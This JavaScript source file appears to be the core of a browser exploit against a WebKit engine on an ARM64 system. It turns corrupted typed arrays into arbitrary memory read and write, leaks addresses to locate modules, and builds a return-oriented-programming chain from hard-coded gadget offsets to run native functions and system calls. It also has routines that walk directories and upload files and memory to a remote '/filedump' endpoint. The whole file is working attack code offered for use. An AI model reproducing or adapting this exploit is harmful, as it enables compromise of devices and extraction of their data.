var utils = require('./utils')
var types = require('./types')

var sploitcore = function(exploitMe) {
  this.gc();

  this.va = exploitMe.va;
  this.vb = exploitMe.vb;
  this.leakee = exploitMe.leakee;
  this.leakaddr = exploitMe.leakaddr;

  this.allocated = {};
  this.sp = null;

  this.func = document.getElementById;
  this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
  this.funcaddr = null;
  this.funcbase = 0x835DC4; // This is the base address for getElementById in the webkit module

  this.base = this.getBase();

  this.mainaddr = this.walkList();
  utils.dlog('Main address ' + utils.paddr(this.mainaddr));

  utils.log('~~success');
};

sploitcore.prototype.dump = function(name, buf, count) {
  for(var j = 0; j < count; ++j)
    utils.log(name + '[' + j + '] == 0x' + buf[j].toString(16));
};
sploitcore.prototype.dumpaddr = function(addr, count) {
  this.va[4] = addr[0];
  this.va[5] = addr[1];
  this.va[6] = count;

  this.dump(paddr(addr), this.vb, count);
};

sploitcore.prototype.read4 = function(addr, offset) {
  if(arguments.length == 1)
    offset = 0;

  this.va[4] = addr[0];
  this.va[5] = addr[1];
  this.va[6] = 1 + offset;

  return this.vb[offset];
};
sploitcore.prototype.write4 = function(val, addr, offset) {
  if(arguments.length == 2)
    offset = 0;

  this.va[4] = addr[0];
  this.va[5] = addr[1];
  this.va[6] = 1 + offset;

  this.vb[offset] = val;
};
sploitcore.prototype.read8 = function(addr, offset) {
  if(arguments.length == 1)
    offset = 0;
  return [this.read4(addr, offset), this.read4(addr, offset + 1)];
};
sploitcore.prototype.write8 = function(val, addr, offset) {
  if(arguments.length == 2)
    offset = 0;
    if(typeof(val) == 'number') 
        val = [val, 0];
  this.write4(val[0], addr, offset);
  this.write4(val[1], addr, offset + 1);
};
sploitcore.prototype.memview = function(addr, size, func) {
  var ab = new ArrayBuffer(0);
  var taddr = this.read8(this.getAddr(ab), 4);

  var origPtr = this.read8(taddr, 6);
  var origSize = this.read4(taddr, 8);
  this.write8(addr, taddr, 6);
  this.write4(size, taddr, 8);

  var ret = func(ab);

  this.write8(origPtr, taddr, 6);
  this.write4(origSize, taddr, 8);

  return ret;
};
sploitcore.prototype.getAddr = function(obj) {
  this.leakee['b'] = {'a' : obj};
  return this.read8(this.read8(this.leakaddr, 4), 4);
};
sploitcore.prototype.mref = function(off) {
  return utils.add2(this.mainaddr, off);
};

sploitcore.prototype.getBase = function() {
  var tlfuncaddr = this.getAddr(this.func);
  this.funcaddr = this.read8(tlfuncaddr, 6);

  var baseaddr = utils.add2(this.read8(this.funcaddr, 8), -this.funcbase);

  utils.dlog('First module ... ' + utils.paddr(baseaddr));

  return baseaddr;
};

sploitcore.prototype.walkList = function() {
  var addr = this.base;
  utils.dlog('Initial NRO at ' + utils.paddr(addr));

  while(true) {
    var baddr = addr;

    var modoff = this.read4(addr, 1);
    addr = utils.add2(addr, modoff);
    var modstr = this.read4(addr, 6);
    addr = utils.add2(addr, modstr);

    // Read next link ptr
    addr = this.read8(addr);
    if(utils.nullptr(addr)) {
      utils.log('Reached end');
      break;
    }

    var nro = this.read8(addr, 8);

    if(utils.nullptr(nro)) {
      utils.dlog('Hit RTLD at ' + utils.paddr(addr));
      addr = this.read8(addr, 4);
      break;
    }

    if(this.read4(nro, 4) != 0x304f524e) {
      utils.log('Something is wrong.  No NRO header at base.');
      break;
    }

    addr = nro;
    utils.dlog('Found NRO at ' + utils.paddr(nro));
  }

  while(true) {
    var nro = this.read8(addr, 8);
    if(utils.nullptr(nro)) {
      utils.dlog('Hm, hit the end of things.  Back in rtld?');
      return;
    }

    if(this.read4(nro, this.read4(nro, 1) >> 2) == 0x30444f4d) {
      utils.dlog('Got MOD at ' + utils.paddr(nro));
      if(this.read4(nro, 4) == 0x8DCDF8 && this.read4(nro, 5) == 0x959620) {
        utils.dlog('Found main module.');
        return nro;
      }
    } else {
      utils.dlog('No valid MOD header.  Back at RTLD.');
      break;
    }

    addr = this.read8(addr, 0);
    if(utils.nullptr(addr)) {
      utils.dlog('End of chain.');
      break;
    }
  }
};

sploitcore.prototype.getSP = function() {
  if(this.sp !== null)
    return this.sp; // This should never change in a session. ... Should.

  var jaddr = this.mref(0x39FEEC); // First gadget
  utils.dlog('New jump at ' + utils.paddr(jaddr));
  utils.dlog('Assigning function pointer');

  utils.dlog('Function object at ' + utils.paddr(this.funcaddr));
  var curptr = this.read8(this.funcaddr, 8);

  var fixed = this.mref(0x91F320);
  var saved = new Uint32Array(0x18 >> 2);
  for(var i = 0; i < saved.length; ++i)
    saved[i] = this.read4(fixed, i);
  
  var struct1 = this.malloc(0x48);
  var struct2 = this.malloc(0x28);
  var struct3 = this.malloc(0x518);
  var struct4 = this.malloc(0x38);

  this.write8(struct1, fixed, 0);
  this.write8(this.mref(0x4967F0), fixed, 0x8 >> 2); // Second gadget
  this.write8(this.mref(0x48FE44), fixed, 0x10 >> 2); // Third gadget

  this.write8(struct2, struct1, 0x10 >> 2);

  this.write8(struct3, struct2, 0);
  this.write8(this.mref(0x2E5F88), struct2, 0x20 >> 2);

  this.write8([0x00000000, 0xffff0000], struct3, 0x8 >> 2);
  this.write8(this.mref(0x1892A4), struct3, 0x18 >> 2);
  this.write8(this.mref(0x46DFD4), struct3, 0x20 >> 2);
  this.write8(struct4, struct3, 0x510 >> 2);

  this.write8(this.mref(0x1F61C0), struct4, 0x18 >> 2);
  this.write8(this.mref(0x181E9C), struct4, 0x28 >> 2);
  this.write8(this.mref(0x1A1C98), struct4, 0x30 >> 2);

  this.write8(jaddr, this.funcaddr, 8);
  utils.dlog('Patched function address from ' + utils.paddr(curptr) + ' to ' + utils.paddr(this.read8(this.funcaddr, 8)));

  utils.dlog('Assigned.  Jumping.');
  utils.dlog(this.func.apply(0x101));
  utils.dlog('Jumped back.');

  this.write8(curptr, this.funcaddr, 8);
  utils.dlog('Restored original function pointer.');

  var sp = utils.add2(this.read8(struct3, 0), -0x18);
  utils.dlog('Got stack pointer: ' + utils.paddr(sp));

  for(var i = 0; i < saved.length; ++i)
    this.write4(saved[i], fixed, i);
  utils.dlog('Restored data page.');

  this.free(struct1);
  this.free(struct2);
  this.free(struct3);
  this.free(struct4);

  utils.dlog('Freed buffers');

  this.sp = sp;

  return sp;
};

sploitcore.prototype.malloc = function(bytes) {
  var obj = new ArrayBuffer(bytes);
  var addr = this.read8(this.read8(this.getAddr(obj), 4), 6);
  this.allocated[addr] = obj;
  return addr;
};
sploitcore.prototype.free = function(addr) {
  this.allocated[addr] = 0;
};

sploitcore.prototype.call = function(funcptr, args, fargs, registers, dump_regs) {
    if(typeof(funcptr) == 'number') {
      funcptr = utils.add2(this.mainaddr, funcptr);
    }
    switch(arguments.length) {
      case 1:
        args = [];
      case 2:
        fargs = [];
      case 3:
        registers = [];
      case 4:
        dump_regs = false;
    }
    var sp = this.getSP();

    utils.dlog('Starting holy rop');
    var jaddr = this.mref(0x39FEEC); // First gadget addr, loads X8 with a fixed address.
    utils.dlog('New jump at ' + utils.paddr(jaddr));

    utils.dlog('Setting up structs');

    var fixed = this.mref(0x91F320);
    var saved = new Uint32Array(12);
    for(var i = 0; i < saved.length; ++i)
      saved[i] = this.read4(fixed, i);

    // Begin Gadgets
    var load_x0_w1_x2_x9_blr_x9 = this.mref(0x4967F0);
    var load_x2_x30_mov_sp_into_x2_br_x30 = this.mref(0x433EB4);
    var load_x2_x8_br_x2 = this.mref(0x1A1C98);
    var load_x30_from_sp_br_x2 = this.mref(0x3C2314);
    var returngadg = this.mref(0x181E9C);

    var savegadg = this.mref(0x4336B0);
    var loadgadg = this.mref(0x433620);
    var loadgadg_stage2 = this.mref(0x3A869C);

    var load_x19 = this.mref(0x6C3E4);
    var str_x20 = this.mref(0x117330);
    var str_x8 = this.mref(0x453530);
    var load_and_str_x8 = this.mref(0x474A98);
    var str_x1 = this.mref(0x581B8C);
    var mov_x2_into_x1 = this.mref(0x1A0454);
    var str_x0 = this.mref(0xFDF4C);
    var str_x9 = this.mref(0x1F8280);
    var mov_x19_into_x0 = this.mref(0x12CC68);

    // End Gadgets

    var context_load_struct = this.malloc(0x200);
    var block_struct_1 = this.malloc(0x200);
    var block_struct_2 = this.malloc(0x200);
    var block_struct_3 = this.malloc(0x200);
    var savearea = this.malloc(0x400);
    var loadarea = this.malloc(0x400);
    var dumparea = this.malloc(0x400);


    // Step 1: Load X8 with a fixed address, control X0:X2

    this.write8(context_load_struct, fixed, 0x00 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x08 >> 2);
    this.write8(load_x2_x30_mov_sp_into_x2_br_x30, fixed, 0x10 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x18 >> 2);
    this.write8(block_struct_1, fixed, 0x28 >> 2);

    // Step 2: Stack pivot to SP - 0x8000. -0x30 to use a LR-loading gadget.

    sp = utils.add2(sp, -0x8030);
    this.write8(load_x2_x8_br_x2, context_load_struct, 0x58 >> 2);
    this.write8(sp, context_load_struct, 0x68 >> 2);
    this.write8(returngadg, context_load_struct, 0x158 >> 2);
    this.write8(utils.add2(sp, 0x8030), context_load_struct, 0x168 >> 2);

    // Step 3: Perform a full context-save of all registers to savearea.

    this.write8(savearea, block_struct_1, 0x0 >> 2);
    this.write8(load_x30_from_sp_br_x2, block_struct_1, 0x10 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_1, 0x18 >> 2);
    this.write8(block_struct_2, block_struct_1, 0x28 >> 2);
    this.write8(savegadg, block_struct_1, 0x38 >> 2);

    this.write8(load_x2_x8_br_x2, sp, 0x28 >> 2);

    sp = utils.add2(sp, 0x30);

    // Step 4: Perform a full context-load from a region we control.

    this.write8(loadarea, block_struct_2, 0x00 >> 2);
    this.write8(loadgadg, block_struct_2, 0x10 >> 2);

    // Step 5: Write desired register contents to the context load region.

    this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
    this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2

    sp = utils.add2(sp, -0x80);

    // Write registers fornative code.
    if(registers.length > 9) {
      for(var i = 9; i < 30 && i < registers.length; i++) {
        this.write8(registers[i], loadarea, (8 * i) >> 2);
      }
    }

    if(registers.length > 0) {
      for(var i = 0; i <= 8 && i < registers.length; i++) {
        this.write8(registers[i], sp, (0x80 + 8 * i) >> 2);
      }

      if(registers.length > 19) {
        this.write8(registers[19], sp, 0xC8 >> 2);
      }

      if(registers.length > 29) {
        this.write8(registers[29], sp, 0xD0 >> 2);
      }
    }

    if(args.length > 0) {
      for(var i = 0; i < args.length && i < 8; i++) {
        this.write8(args[i], sp, (0x80 + 8 * i) >> 2)
      }
    }

    if(fargs.length > 0) {
      for(var i = 0; i < fargs.length && i < 32; i++) {
        this.write8(fargs[i], loadarea, (0x110 + 8 * i) >> 2);
      }
    }

    this.write8(funcptr, loadarea, 0x80 >> 2); // Set the code to call to our function pointer.
    this.write8(load_x19, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop

    // Stack arguments would be bottomed-out at sp + 0xE0...
    // TODO: Stack arguments support. Would just need to figure out how much space they take up
    // and write ROP above them. Note: the user would have to call code that actually used
    // that many stack arguments, or shit'd crash.

    // ROP currently begins at sp + 0xE0

    // Step 6: [Arbitrary code executes here]

    // Step 7: Post-code execution cleanup. Dump all registers to another save area,
    //         return cleanly to javascript.

    this.write8(utils.add2(dumparea, 0x300 - 0x10), sp, (0xE0 + 0x28) >> 2); // Load X19 = dumparea + 0x300 - 0x10
    this.write8(str_x20, sp, (0xE0 + 0x38) >> 2);                      // Load LR with str_x20
    this.write8(utils.add2(dumparea, 0x308), sp, (0x120 + 0x8) >> 2);        // Load X19 = dumparea + 0x308
    this.write8(str_x8, sp, (0x120 + 0x18) >> 2);                      // Load LR with str_x8
    this.write8(utils.add2(dumparea, 0x310 - 0x18), sp, (0x140 + 0x0) >> 2); // Load X19 = dumparea + 0x310 - 0x18
    this.write8(str_x1, sp, (0x140 + 0x18) >> 2);                      // Load LR with str_x1
    this.write8(utils.add2(dumparea, 0x3F8), sp, (0x160 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(utils.add2(dumparea, 0x380), sp, (0x160 + 0x8) >> 2);        // Load X19 = dumparea + 0x380
    this.write8(str_x1, dumparea, 0x380 >> 2);                         // Write str_x1 to dumparea + 0x380
    this.write8(load_and_str_x8, sp, (0x160 + 0x18) >> 2);             // Load LR with Load, STR X8
    this.write8(utils.add2(dumparea, 0x318 - 0x18), sp, (0x180 + 0x8) >> 2); // Load X19 = dumparea + 0x318 - 0x18
    this.write8(mov_x2_into_x1, sp, (0x180 + 0x18) >> 2);              // Load LR with mov x1, x2
    this.write8(utils.add2(dumparea, 0x3F8), sp, (0x1A0 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(utils.add2(dumparea, 0x320), sp, (0x1A0 + 0x8) >> 2);        // Load X19 = dumparea + 0x320
    this.write8(str_x0, sp, (0x1A0 + 0x18) >> 2);                      // Load LR with str x0
    this.write8(utils.add2(dumparea, 0x388), sp, (0x1C0 + 0x0) >> 2);        // Load X19 = dumparea + 0x388
    this.write8(utils.add2(dumparea, 0x320), dumparea, 0x388 >> 2);          // Write dumparea + 0x320 to dumparea + 0x388
    this.write8(load_and_str_x8, sp, (0x1C0 + 0x18) >> 2);             // Load LR with load, STR X8
    this.write8(utils.add2(dumparea, 0x3F8), sp, (0x1E0 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(utils.add2(dumparea, 0x328 - 0x58), sp, (0x1E0 + 0x8) >> 2); // Load X19 = dumparea + 0x328 - 0x58
    this.write8(str_x9, sp, (0x1E0 + 0x18) >> 2);                      // Load LR with STR X9
    this.write8(utils.add2(dumparea, 0x390), sp, (0x200 + 0x0) >> 2);        // Load X19 with dumparea + 0x390
    this.write8(block_struct_3, dumparea, 0x390 >> 2);                 // Write block struct 3 to dumparea + 0x390
    this.write8(load_and_str_x8, sp, (0x200 + 0x18) >> 2);             // Load LR with load, STR X8
    this.write8(load_x0_w1_x2_x9_blr_x9, sp, (0x220 + 0x18) >> 2);     // Load LR with gadget 2

    // Block Struct 3
    this.write8(dumparea, block_struct_3, 0x00 >> 2);
    this.write8(load_x30_from_sp_br_x2, block_struct_3, 0x10 >> 2);
    this.write8(savegadg, block_struct_3, 0x38 >> 2);

    this.write8(utils.add2(str_x20, 0x4), sp, (0x240 + 0x28) >> 2);          // Load LR with LD X19, X20, X30
    this.write8(utils.add2(savearea, 0xF8), sp, (0x270 + 0x0) >> 2);         // Load X20 with savearea + 0xF8 (saved SP)
    this.write8(utils.add2(dumparea, 0x398), sp, (0x270 + 0x8) >> 2);        // Load X19 with dumparea + 0x398
    this.write8(utils.add2(sp, 0x8080), dumparea, 0x398 >> 2);               // Write SP to dumparea + 0x38
    this.write8(load_and_str_x8, sp, (0x270 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(utils.add2(savearea, 0x100), sp, (0x290 + 0x0) >> 2);        // Load X20 with savearea + 0x100 (saved LR)
    this.write8(utils.add2(dumparea, 0x3A0), sp, (0x290 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A0
    this.write8(returngadg, dumparea, 0x3A0 >> 2);                     // Write return gadget to dumparea + 0x3A0
    this.write8(load_and_str_x8, sp, (0x290 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(utils.add2(savearea, 0xC0), sp, (0x2B0 + 0x0) >> 2);         // Load X20 with savearea + 0xC0 (saved X24)
    this.write8(utils.add2(dumparea, 0x3A8), sp, (0x2B0 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A8
    this.write8([0x00000000, 0xffff0000], dumparea, 0x3A8 >> 2);       // Write return gadget to dumparea + 0x3A8
    this.write8(load_and_str_x8, sp, (0x2B0 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(savearea, sp, (0x2D0 + 0x8) >> 2);                     // Load X19 with savearea
    this.write8(mov_x19_into_x0, sp, (0x2D0 + 0x18) >> 2);             // Load X30 with mov x0, x19.
    this.write8(loadgadg, sp, (0x2F0 + 0x18) >> 2);                    // Load X30 with context load

    sp = utils.add2(sp, 0x8080);

    utils.dlog('Assigning function pointer');

    utils.dlog('Function object at ' + utils.paddr(this.funcaddr));
    var curptr = this.read8(this.funcaddr, 8);
    this.write8(jaddr, this.funcaddr, 8);
    utils.dlog('Patched function address from ' + utils.paddr(curptr) + ' to ' + utils.paddr(this.read8(this.funcaddr, 8)));
    utils.dlog('Jumping.');
    this.func.apply(0x101);
    utils.dlog('Jumped back.');

    this.write8(curptr, this.funcaddr, 8);
    utils.dlog('Restored original function pointer.');

    var ret = this.read8(dumparea, 0x320 >> 2);

    if(dump_regs) {
      utils.log('Register dump post-code execution:');
      for(var i = 0; i <= 30; i++) {
        if(i == 0) {
          utils.log('X0: ' + utils.paddr(this.read8(dumparea, 0x320 >> 2)));
        } else if(i == 1) {
          utils.log('X1: ' + utils.paddr(this.read8(dumparea, 0x310 >> 2)));
        } else if(i == 2) {
          utils.log('X2: ' + utils.paddr(this.read8(dumparea, 0x318 >> 2)));
        } else if(i == 8) {
          utils.log('X8: ' + utils.paddr(this.read8(dumparea, 0x308 >> 2)));
        } else if(i == 9) {
          utils.log('X9: ' + utils.paddr(this.read8(dumparea, 0x328 >> 2)));
        } else if(i == 20) {
          utils.log('X20: ' + utils.paddr(this.read8(dumparea, 0x300 >> 2)));
        } else if(i == 16 || i == 19 || i == 29 || i == 30) { 
          utils.log('X' + i + ': Not dumpable.');
        } else {
          utils.log('X' + i + ': ' + utils.paddr(this.read8(dumparea, (8 * i) >> 2)));
        }
      }
    }

    for(var i = 0; i < saved.length; ++i)
      this.write4(saved[i], fixed, i);
    utils.dlog('Restored data page.');

    utils.dlog('Native code at ' + utils.paddr(funcptr) + ' returned: ' + utils.paddr(ret));

    this.free(context_load_struct);
    this.free(block_struct_1);
    this.free(block_struct_2);
    this.free(block_struct_3);
    this.free(savearea);
    this.free(loadarea);
    this.free(dumparea);

    utils.dlog('Freed all buffers');
    return ret;
};

sploitcore.prototype.svc = function(id, registers, dump_regs) {
  var svc_list = {
    0x01: 0x3BBE10,
    0x02: 0x3BBE28,
    0x03: 0x3BBE30,
    0x04: 0x3BBE38,
    0x05: 0x3BBE40,
    0x06: 0x3BBE48,
    0x07: 0x3BBE60,
    0x08: 0x3BBE68,
    0x09: 0x3BBE80,
    0x0A: 0x3BBE88,
    0x0B: 0x3BBE90,
    0x0C: 0x3BBE98,
    0x0D: 0x3BBEB0,
    0x0E: 0x3BBEB8,
    0x0F: 0x3BBED8,
    0x10: 0x3BBEE0,
    0x11: 0x3BBEE8,
    0x12: 0x3BBEF0,
    0x13: 0x3BBEF8,
    0x14: 0x3BBF00,
    0x15: 0x3BBF08,
    0x16: 0x3BBF20,
    0x17: 0x3BBF28,
    0x18: 0x3BBF30,
    0x19: 0x3BBF48,
    0x1A: 0x3BBF50,
    0x1B: 0x3BBF58,
    0x1C: 0x3BBF60,
    0x1D: 0x3BBF68,
    //0x1E: ,
    0x1F: 0x3BBF70,
    //0x20: ,
    0x21: 0x3BBF88,
    0x22: 0x3BBF90,
    //0x23: 0x,
    //0x24: 0x,
    0x25: 0x3BBF98,
    0x26: 0x3BBFB0,
    0x27: 0x3BBFB8,
    0x28: 0x3BBFC0,
    0x29: 0x3BBFC8,
    //0x2A-0x4F
    0x50: 0x3BBFE0,
    0x51: 0x3BBFF8,
    0x52: 0x3BC000
  };

  if(!(id in svc_list)) {
    utils.log('Failed to call svc 0x' + id.toString(16) + '.');
  }

  return this.call(svc_list[id], [], [], registers, dump_regs);
}

sploitcore.prototype.getTLS = function() {
  return this.call(0x3ACE54, []);
};

sploitcore.prototype.queryMem = function(addr, raw) {
  if(arguments.length == 1)
    raw = false;
  var meminfo = this.malloc(0x20);
  var pageinfo = this.malloc(0x8);
  var svcQueryMemory = 0x3BBE48;

  var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
  var memstates = ['FREE', 'RESERVED', 'IO', 'STATIC', 'CODE', 'PRIVATE', 'SHARED', 'CONTINUOUS', 'ALIASED', 'ALIAS', 'ALIAS CODE', 'LOCKED'];
  this.call(svcQueryMemory, [meminfo, pageinfo, addr]);

  var ms = this.read8(meminfo, 0x10 >> 2);
  if(!raw && ms[1] == 0 && ms[0] < memstates.length)
    ms = memstates[ms[0]];
  else if(!raw)
    ms = 'UNKNOWN'
  var mp = this.read8(meminfo, 0x18 >> 2);
  if(!raw && mp[1] == 0 && mp[0] < memperms.length)
    mp = memperms[mp[0]];

  var data = [this.read8(meminfo, 0 >> 2), this.read8(meminfo, 0x8 >> 2), ms, mp, this.read8(pageinfo, 0 >> 2)];

  this.free(meminfo);
  this.free(pageinfo);

  return data;
};

sploitcore.prototype.getServiceHandle = function(name) {
  var handlePtr = this.malloc(0x4);
  var smGetServiceHandle = this.bridge(0x3AD15C, types.int, types.void_p, types.char_p, types.int);
  utils.log('smGetServiceHandle("' + name + '")...');
  var res = smGetServiceHandle(handlePtr, name, name.length);
  var handle = this.read4(handlePtr);
  this.free(handlePtr);
  utils.log('smGetServiceHandle("' + name + '") == 0x' + res[0].toString(16) + ', 0x' + handle.toString(16));
  return [res, handle]
}

sploitcore.prototype.str2buf = function(inp) {
  var len = inp.length + 1;
  var v = this.malloc(len);
  this.memview(v, len, function(view) {
    var u8b = new Uint8Array(view);
    for(var j = 0; j < len; ++j)
      u8b[j] = inp.charCodeAt(j);
    u8b[inp.length] = 0;
  });

  return v;
};

sploitcore.prototype.getFileSize = function(fhandle) {
  var fseek = this.bridge(0x438B18, null, types.void_p, types.int, types.int);
  var ftell = this.bridge(0x438BE0, types.int, types.void_p);

  fseek(fhandle, 0, 2);
  var fsize = ftell(fhandle);
  fseek(fhandle, 0, 0);

  return fsize;
};

sploitcore.prototype.dumpFile = function(fn) {
  var fopen = this.bridge(0x43DDB4, types.void_p, types.char_p, types.char_p); //FILE * fopen ( const char * filename, const char * mode );
  var fread = this.bridge(0x438A14, types.int, types.void_p, types.int, types.int, types.void_p); //size_t fread ( void * ptr, size_t size, size_t count, FILE * stream );
  var fclose = this.bridge(0x4384D0, types.int, types.void_p); //int fclose ( FILE * stream );

  var fhandle = fopen(fn, 'r');
  utils.log('foo ' + utils.paddr(fhandle));
  if(!utils.nullptr(fhandle)) {
    var fsize = this.getFileSize(fhandle);
    var ofs = 0;
    var arr = new ArrayBuffer(0x800000);
    var int8view = new Uint8Array(arr);
    var outbuf = this.read8(this.getAddr(int8view), 4);
    var sz = fsize[0]; // XXX: Add primitive for converting our double-uint32 arrays into numbers
    while (sz > 0) {
      if(sz < 0x800000) {
        arr = new ArrayBuffer(sz);
        int8view = new Uint8Array(arr);
        outbuf = this.read8(this.getAddr(int8view), 4);
      }
      fread(outbuf, 1, sz < 0x800000 ? sz : 0x800000, fhandle);
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/filedump', false);
      xhr.setRequestHeader('Content-Type', 'application/octet-stream');
      xhr.setRequestHeader('Content-Disposition', fn);
      xhr.send(int8view);
      xhr = null;
      sz -= 0x800000;
    }
    utils.log(fn + ' is ' + utils.paddr(fsize) + ' bytes.');
    
    fclose(fhandle);
  } else {
    utils.log('Failed to open file '+ fn + '!');
  }
};

sploitcore.prototype.memdump = function(offset, size, fn) {
  var totalSize = size;
  var idx = 0;

  utils.log('Dumping memory!');
  for(var idx = 0; idx < size; idx += 0x800000) {
    size = totalSize - idx;
    size = size > 0x800000 ? 0x800000 : size;

    this.memview(utils.add2(offset, idx), size, function(ab) {
      var view = new Uint8Array(ab);
      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/filedump', false);
      xhr.setRequestHeader('Content-Type', 'application/octet-stream');
      xhr.setRequestHeader('Content-Disposition', fn);
      xhr.send(view);
    });
  }
  utils.log('Dumped memory succesfully!');
};

sploitcore.prototype.dirlist = function(dirPath) {
  var dumpFiles = true;
  
  var OpenDirectory = this.bridge(0x233894, types.int, types.void_p, types.char_p, types.int); //int OpenDirectory(_QWORD *handle, char *path, unsigned int flags)
  var ReadDirectory = this.bridge(0x2328B4, types.int, types.void_p, types.void_p, types.void_p, types.int); //int ReadDirectory(_QWORD *sDirInfo, _QWORD *out, _QWORD *handle, __int64 size)
  var CloseDirectory = this.bridge(0x232828, types.int, types.void_p); //int CloseDirectory(_QWORD *handle)
  
  var entrySize = 0x310;
  var numFilesToList = 128;
  var fileListSize = numFilesToList*entrySize;
  var handlePtr = this.malloc(0x8);
  var sDirInfo = this.malloc(0x200);
  var sFileList = this.malloc(fileListSize);
  var ret = OpenDirectory(handlePtr,dirPath,3);
  utils.log('OpenDirectory ret=' + ret);
  
  var handle = this.read8(handlePtr);
  ret = ReadDirectory(sDirInfo,sFileList,handle,numFilesToList);
  utils.log('ReadDirectory ret=' + ret);
  
  var arr = new ArrayBuffer(fileListSize);
  var int8view = new Uint8Array(arr);
  var int32view = new Uint32Array(arr);
  
  utils.log('File Listing for' + dirPath);
  for(var i = 0; i < fileListSize/4; ++i) {
    int32view[i] = this.read4(sFileList, i);
    if((i % (entrySize/4)) == ((entrySize/4)-1)) {
      var string = '';
      var j=Math.floor(i/(entrySize/4)) * entrySize;
      var isFile = (j + 0x304)/4;
      var fileSize = (j + 0x304)/4;
      while(int8view[j] != 0) {
        string += String.fromCharCode(int8view[j]);
        j++;
      }
      if(string != '') {
        utils.log(((int32view[isFile] != 0) ? "FILE   " : "FOLDER ") + dirPath + string + ' ' + ((int32view[isFile] != 0) ? ' Size = ' + fileSize : ''));
        
        if(int32view[isFile] == 0) { //is Folder
          this.dirlist(dirPath + string + '/');
        } else {
          if(dumpFiles)
            this.dumpFile(dirPath + string);
        }
      }
    }
  }
  utils.log('End Listing');
  
  /*var xhr = new XMLHttpRequest();
  xhr.open('POST', '/filedump', false);
  xhr.setRequestHeader('Content-Type', 'application/octet-stream');
  xhr.setRequestHeader('Content-Disposition', '/shareddata.bin');
  xhr.send(int8view);
  xhr = null;*/
  
  ret = CloseDirectory(handle);
  utils.log('CloseDirectory ret=' + ret);
  
  this.free(handle);
  this.free(sFileList);
  this.free(sDirInfo);
};

sploitcore.prototype.bridge = function(ptr, rettype) {
  if(typeof(ptr) == 'number')
    ptr = utils.add2(this.mainaddr, ptr);
  var self = this;
  var args = Array.prototype.slice.call(arguments, [2]);

  if(rettype == 'float')
    throw 'Float returns not supported yet';

  var sub = function() {
    if(arguments.length != args.length)
      throw 'Mismatched argument counts';

    var nargs = [], nfargs = [];
    for(var i = 0; i < args.length; ++i) {
      var inp = arguments[i], type = args[i], v = null, fv = null;
      switch(type) {
        case types.int: case types.void_p:
          if(typeof(inp) == 'number')
            v = [inp, 0];
          else
            v = inp;
          break;
        case types.float:
          var bbuf = new ArrayBuffer(8);
          (new Float64Array(bbuf))[0] = inp;
          var ubuf = new Uint32Array(bbuf);
          fv = [ubuf[0], ubuf[1]];
          break;
        case types.bool:
          v = [~~inp, 0];
          break;
        case types.char_p:
          if(typeof(inp) == 'number')
            v = [inp, 0];
          else if(typeof(inp) != 'string')
            v = inp;
          else
            v = self.str2buf(inp);
          break;
      }
      if(v != null)
        nargs.push(v);
      else
        nfargs.push(fv);
    }

    var retval = self.call(ptr, nargs, nfargs);

    switch(rettype) {
      case types.char_p:
        retval = self.readString(retval);
        break;
    }

    for(var i = 0; i < args.length; ++i) {
      var na = nargs[i], type = args[i];
      switch(type) {
        case types.char_p:
          self.free(na);
          break;
      }
    }

    return retval;
  };

  sub.addr = ptr;
  sub.args = args;
  sub.rettype = rettype;

  return sub;
};

sploitcore.prototype.gc = function() {
  utils.dlog('Beginning GC force');
  function sub(depth) {
    utils.dlog('GC force ' + depth);
    if(depth > 0) {
      var arr = [];
      utils.dlog('Building...');
      for(var i = 0; i < 10; ++i)
        arr.push(new Uint8Array(0x40000));
      utils.dlog('Shifting...');
      while(arr.length > 0)
        arr.shift();
      sub(depth - 1);
    }
  }
  sub(20);
  utils.dlog('GC should be solid');
};

sploitcore.prototype.readString = function(addr, length) {
  if(arguments.length == 1)
    length = -1;

  return this.memview(addr, 0xFFFFFFFF, function(view) {
    var u8b = new Uint8Array(view);
    var out = '';

    for(var i = 0; (length == -1 && u8b[i] != 0) || (length != -1 && i < length); i++)
      out += String.fromCharCode(u8b[i]);

    return out;
  });
};

module.exports = sploitcore
